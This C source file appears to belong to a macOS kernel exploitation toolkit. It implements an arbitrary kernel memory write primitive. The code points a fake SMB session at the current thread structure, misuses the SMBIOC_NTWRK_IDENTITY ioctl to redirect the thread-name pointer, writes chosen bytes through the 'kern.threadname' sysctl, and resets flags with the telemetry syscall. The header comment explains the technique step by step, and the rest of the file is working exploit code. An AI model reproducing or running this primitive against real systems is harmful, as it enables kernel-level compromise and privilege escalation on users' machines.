//
//  kmem_write_session.c
//  xe_kmem
//
//  Created by sreejith on 2/25/22.
//

#include <assert.h>
#include <pthread.h>

#include <sys/kauth.h>
#include <sys/sysctl.h>
#include <mach/thread_info.h>

#include <xe/memory/kmem.h>
#include <xe/xnu/proc.h>
#include <xe/xnu/thread.h>
#include <xe/util/assert.h>

#include <macos/macos.h>

#include "kmem_write_session.h"
#include "smb/params.h"
#include "smb/client.h"


extern int __telemetry(uint64_t cmd, uint64_t deadline, uint64_t interval, uint64_t leeway, uint64_t arg4, uint64_t arg5);


/*
 * The ioctl command of type SMBIOC_NTWRK_IDENTITY is used the set the network user
 * identitiy of a smb session. This ioctl command is handled by method `smb_usr_set_network_identity`
 * as shown below
 *
 * int smb_usr_set_network_identity(struct smb_session *sessionp, struct smbioc_ntwrk_identity *ntwrkID)
 * {
 *     if (sessionp->session_flags & SMBV_NETWORK_SID) {
 *         return EEXIST;
 *     }
 *
 *     if (ntwrkID->ioc_ntsid_len != sizeof(ntsid_t)) {
 *         return EINVAL;
 *     }
 *     memcpy(&sessionp->session_ntwrk_sid, &ntwrkID->ioc_ntsid, (size_t)ntwrkID->ioc_ntsid_len);
 *     sessionp->session_flags |= SMBV_NETWORK_SID;
 *     return 0;
 * }
 *
 * The code path handling the SMBIOC_NTWRK_IDENTITY ioctl will only access fields
 * `sessionp->session_flags` and `sessionp->session_ntwrk_sid`. By adjusting the value of
 * `smb_dev->sd_session` pointer we can use this ioctl command to write data to a arbitary location
 * in kernel memory. But there are two disadvantages of using this method :-
 *
 * 1) For the write to happen, SMBV_NETWORK_SID flag in `sessionp->session_flags` must be cleared.
 *    When writing to arbitary kernel memory location, this condition may not always be satisfied
 * 2) Once the write is done, SMBV_NETWORK_SID flag in `sessionp->session_flags` is set which may
 *    cause unintented side effects
 *
 * These disadvantages limits this method from being used directly as a powerful arbitary memory write
 * primitive. But this method can be used to control pointers in other data structures which inturn
 * can then write to arbitary kernel memory locations.
 *
 * In `struct thread` data structure, the member `thread_name` is a pointer to dynamically allocated
 * buffer. This buffer is used for storing the thread name which can be written using "kern.threadname"
 * sysctl. Another member in thread, `ith_voucher_name` can be controlled using the `telemetry`
 * syscall. By aligning the member `sessionp->session_flags` with `thread->ith_voucher_name`
 * we can build a general purpose arbitary kernel memory writer. The `SMBV_NETWORK_SID` ioctl command
 * can be used to set the value of pointer `thread->thread_name`. Then the "kern.threadname" sysctl
 * can be used to write data to the address in `thread->thread_name`. To perform another kernel memory
 * write, the `SMBV_NETWORK_SID` flag set on `sessionp->session_flags` must be cleared which can be
 * done using the `telemetry` syscall
 */


struct kmem_write_session {
    uintptr_t thread;
    uint64_t thread_id;
    ntsid_t write_data;
};


uint64_t kmem_write_session_get_thread_id(void) {
    uint64_t thread_id;
    int error = pthread_threadid_np(pthread_self(), &thread_id);
    xe_assert_err(error);
    return thread_id;
}


// Create a fake smb_session that can be used for arbitary kernel memory write
kmem_write_session_t kmem_write_session_create(const struct sockaddr_in* smb_addr) {
    uintptr_t thread = xe_xnu_thread_current_thread();
    
    uintptr_t ith_voucher_name = thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET;
    xe_assert_cond(xe_kmem_read_uint32(ith_voucher_name, 0), ==, 0);
    uintptr_t thread_name = thread + TYPE_THREAD_MEM_THREAD_NAME_OFFSET;
    
    /// Align `thread->ith_voucher_name` with `sessionp->session_flags`
    uintptr_t session = ith_voucher_name - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
    
    /// Make sure that `thread->thread_name` pointer can be controlled by writing to `sessionp->session_ntwrk_sid`
    uintptr_t write_start = session + TYPE_SMB_SESSION_MEM_SESSION_NTWRK_SID_OFFSET;
    uintptr_t write_end = write_start + sizeof(ntsid_t);
    xe_assert_cond(write_end, <=, thread + TYPE_THREAD_SIZE);
    xe_assert_cond(write_start, <=, thread_name);
    xe_assert_cond(thread_name + sizeof(uintptr_t), <=, write_end);
    
    struct kmem_write_session* ws = malloc(sizeof(struct kmem_write_session));
    ws->thread = thread;
    xe_kmem_read(&ws->write_data, write_start, 0, sizeof(ws->write_data));
    ws->thread_id = kmem_write_session_get_thread_id();
    
    return ws;
}


// Write data of size 64 bytes to arbitary kernel memory location
void kmem_write_session_write_block(kmem_write_session_t session, int smb_dev, uintptr_t dst, char data[MAXTHREADNAMESIZE]) {
    /// Since `thread_name` is a C string, the "kern.threadname" sysctl handler always set the last byte
    /// to null byte. This assertion makes sure the caller is aware of this limitation
    xe_assert_cond(data[MAXTHREADNAMESIZE - 1], ==, '\0');
    xe_assert_cond(kmem_write_session_get_thread_id(), ==, session->thread_id);
        
    uintptr_t thread = session->thread;
    uintptr_t smb_session = thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
    
    /// Clear SMBV_NETWORK_SID flag from `sessionp->session_flags`
    int res = __telemetry(2, 0, 0, 0, 0, 0);
    xe_assert_errno(res);
    
    uintptr_t write_start = smb_session + TYPE_SMB_SESSION_MEM_SESSION_NTWRK_SID_OFFSET;
    uintptr_t thread_name = thread + TYPE_THREAD_MEM_THREAD_NAME_OFFSET;
    
    ntsid_t ntsid = session->write_data;
    *((uint64_t*)((char*)&ntsid + (thread_name - write_start))) = dst;
    
    /// Sets the value of `thread->thread_name` pointer to dst
    int error = smb_client_ioc_set_ntwrk_identity(smb_dev, &ntsid);
    xe_assert_err(error);
    
    /// Writes data to dst
    res = sysctlbyname("kern.threadname", NULL, NULL, data, MAXTHREADNAMESIZE - 1);
    xe_assert_errno(res);
    
    /// Clear SMBV_NETWORK_SID flag on `sessionp->session_flags` set by previous ioctl
    res = __telemetry(2, 0, 0, 0, 0, 0);
    xe_assert_errno(res);
    
    /// Restore the `thread->thread_name` pointer back to original value
    error = smb_client_ioc_set_ntwrk_identity(smb_dev, &session->write_data);
    xe_assert_err(error);
}


// Returns the address of fake smb_session which can be set to `smb_dev->sd_session`
// using `smb_dev_rw.c` for arbitary kernel memory read
uintptr_t kmem_write_session_get_addr(kmem_write_session_t session) {
    uintptr_t thread = session->thread;
    return thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
}


void kmem_write_session_destroy(kmem_write_session_t* session_p) {
    uintptr_t thread = xe_xnu_thread_current_thread();
    xe_kmem_write_uint64(thread, TYPE_THREAD_MEM_THREAD_NAME_OFFSET, 0);
    free(*session_p);
    *session_p = NULL;
}
